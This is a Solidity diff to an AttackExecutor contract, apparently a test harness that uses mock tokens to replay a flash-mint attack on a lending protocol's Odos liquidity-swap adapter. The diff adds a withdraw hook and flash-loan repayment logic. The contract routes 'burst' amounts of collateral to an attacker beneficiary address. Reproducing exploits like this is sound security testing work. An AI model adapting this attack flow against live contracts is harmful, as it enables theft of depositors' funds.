@@ -5,10 +5,11 @@ import { IERC20 } from "contracts/dlend/core/dependencies/openzeppelin/contracts
 import { SafeERC20 } from "contracts/dlend/core/dependencies/openzeppelin/contracts/SafeERC20.sol";
 import { Ownable } from "contracts/dlend/core/dependencies/openzeppelin/contracts/Ownable.sol";
 import { IOdosLiquiditySwapAdapter } from "contracts/dlend/periphery/adapters/odos/interfaces/IOdosLiquiditySwapAdapter.sol";
+import { IWithdrawHook } from "../dlend/IWithdrawHook.sol";
 import { DusdHelperMock } from "./DusdHelperMock.sol";
 import { TestMintableERC20 } from "../token/TestMintableERC20.sol";
 
-contract AttackExecutor is Ownable {
+contract AttackExecutor is Ownable, IWithdrawHook {
     using SafeERC20 for IERC20;
 
     struct StageAddresses {
@@ -27,6 +28,8 @@ contract AttackExecutor is Ownable {
     IOdosLiquiditySwapAdapter public immutable adapter;
     address public immutable attackerBeneficiary;
 
+    address public pool;
+
     DusdHelperMock public stagingVault;
     DusdHelperMock public recycler;
     DusdHelperMock public splitter;
@@ -34,6 +37,7 @@ contract AttackExecutor is Ownable {
     address public microDistributorTwo;
 
     uint256 public flashLoanAmount;
+    bool public flashMintActive;
 
     uint256 private constant FLASH_MINT_AMOUNT = 27_000 * 1e18;
     uint256 private constant DUSD_STAGE_ONE = 21_444_122_422_884_130_710_969;
@@ -47,7 +51,11 @@ contract AttackExecutor is Ownable {
 
     uint256 private constant BURST_ONE = 26_230_630_089;
     uint256 private constant BURST_TWO = 8_877_536_706;
-    uint256 private constant DUSD_DUST = 1;
+    uint256 private constant OUTPUT_DUST = 0;
+
+    error InvalidPool(address provided);
+    error UnauthorizedPool(address sender, address expected);
+    error UnexpectedCollateral(address actual, address expected);
 
     event FlashMintStart(uint256 amount);
     event FlashMintSettled(uint256 amount);
@@ -74,6 +82,13 @@ contract AttackExecutor is Ownable {
         attackerBeneficiary = attackerBeneficiary_;
     }
 
+    function setPool(address pool_) external onlyOwner {
+        if (pool_ == address(0)) {
+            revert InvalidPool(pool_);
+        }
+        pool = pool_;
+    }
+
     function configureDusdHelpers(StageAddresses calldata addresses) external onlyOwner {
         if (addresses.stagingVault != address(0)) {
             stagingVault = DusdHelperMock(addresses.stagingVault);
@@ -98,20 +113,19 @@ contract AttackExecutor is Ownable {
         IOdosLiquiditySwapAdapter.LiquiditySwapParams calldata params,
         IOdosLiquiditySwapAdapter.PermitInput calldata permitInput
     ) external onlyOwner {
+        flashLoanAmount = 0;
+
         if (params.withFlashLoan) {
             flashLoanAmount = params.collateralAmountToSwap;
             _startFlashMint();
         } else {
-            flashLoanAmount = 0;
-            dusdToken.mint(address(this), DUSD_DUST);
+            flashMintActive = false;
+            if (OUTPUT_DUST > 0) {
+                dusdToken.mint(address(this), OUTPUT_DUST);
+            }
         }
 
         adapter.swapLiquidity(params, permitInput);
-
-        if (!params.withFlashLoan && params.newCollateralAmount > 0) {
-            collateralErc20.safeTransfer(router, params.newCollateralAmount);
-            emit CollateralDustReturned(router, params.newCollateralAmount);
-        }
 
         if (params.withFlashLoan) {
             _simulateCollateralHarvest();
@@ -145,11 +159,18 @@ contract AttackExecutor is Ownable {
         flashLoanAmount = amountPulled;
         emit FlashLoanRecorded(amountPulled);
 
-        dusdErc20.safeTransfer(address(adapter), DUSD_DUST);
-        emit CollateralDustReturned(address(adapter), DUSD_DUST);
+        if (flashMintActive) {
+            collateralToken.burn(amountPulled);
+        }
+
+        if (OUTPUT_DUST > 0) {
+            dusdErc20.safeTransfer(address(adapter), OUTPUT_DUST);
+            emit CollateralDustReturned(address(adapter), OUTPUT_DUST);
+        }
     }
 
     function _startFlashMint() internal {
+        flashMintActive = true;
         dusdToken.mint(address(this), FLASH_MINT_AMOUNT);
         emit FlashMintStart(FLASH_MINT_AMOUNT);
 
@@ -166,12 +187,11 @@ contract AttackExecutor is Ownable {
     function _finalizeFlashMint() internal {
         dusdToken.burn(FLASH_MINT_AMOUNT);
         emit FlashMintSettled(FLASH_MINT_AMOUNT);
+        flashMintActive = false;
+        flashLoanAmount = 0;
     }
 
     function _simulateCollateralHarvest() internal {
-        uint256 totalMint = flashLoanAmount + BURST_ONE + BURST_TWO;
-        collateralToken.mint(address(this), totalMint);
-
         if (flashLoanAmount > 0) {
             collateralErc20.safeTransfer(address(adapter), flashLoanAmount);
             emit FlashLoanRepayment(address(adapter), flashLoanAmount);
@@ -182,6 +202,38 @@ contract AttackExecutor is Ownable {
 
         collateralErc20.safeTransfer(attackerBeneficiary, BURST_TWO);
         emit AttackerBurst(1, BURST_TWO, attackerBeneficiary);
+    }
+
+    function onWithdraw(
+        address asset,
+        address caller,
+        address originalRecipient,
+        uint256 amount
+    ) external override {
+        caller;
+        originalRecipient;
+        amount;
+
+        if (msg.sender != pool) {
+            revert UnauthorizedPool(msg.sender, pool);
+        }
+        if (asset != address(collateralToken)) {
+            revert UnexpectedCollateral(asset, address(collateralToken));
+        }
+
+        if (flashLoanAmount > 0) {
+            uint256 repayAmount = flashLoanAmount;
+            uint256 balance = collateralErc20.balanceOf(address(this));
+            if (balance < repayAmount) {
+                repayAmount = balance;
+            }
+
+            if (repayAmount > 0) {
+                collateralErc20.safeTransfer(address(adapter), repayAmount);
+                emit FlashLoanRepayment(address(adapter), repayAmount);
+                flashLoanAmount = flashLoanAmount - repayAmount;
+            }
+        }
     }
 
     function _maybeTransferDusd(address target, uint256 amount) internal {
